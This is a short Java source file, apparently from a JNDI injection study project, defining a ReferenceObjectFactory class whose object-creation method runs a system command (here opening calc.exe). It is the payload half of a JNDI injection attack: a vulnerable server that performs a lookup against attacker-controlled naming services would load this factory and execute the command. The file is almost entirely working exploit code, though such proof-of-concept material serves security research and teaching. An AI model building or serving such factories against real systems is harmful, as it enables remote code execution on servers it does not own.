package cc.saferoad.jndi;/*
@auther S0cke3t
@date 2021-11-18
*/

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;

public class ReferenceObjectFactory  implements ObjectFactory {
    @Override
    public Object getObjectInstance(Object o, Name name, Context context, Hashtable<?, ?> hashtable) throws Exception {
        return Runtime.getRuntime().exec("calc.exe");
    }

    public static void main(String[] args) {

    }
}
